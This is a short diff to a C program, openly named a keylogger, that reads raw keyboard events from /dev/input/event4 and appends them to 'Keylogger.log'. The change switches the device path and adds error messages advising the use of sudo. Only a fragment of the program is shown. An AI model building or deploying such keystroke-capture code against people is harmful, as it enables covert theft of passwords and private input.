@@ -56,13 +56,15 @@ int main() {
     
     time_t start_time = time(NULL);
     
-    int inputFile = open("/dev/input/event3", O_RDONLY);
+    int inputFile = open("/dev/input/event4", O_RDONLY);
     if (inputFile == -1) {
+        printf("Access denied. Use sudo");
         return 0;
     }
     
     FILE* logFile = fopen("Keylogger.log", "a");
     if (!logFile) {
+        printf("Log File error.");
         close(inputFile);
         return 0;
     }
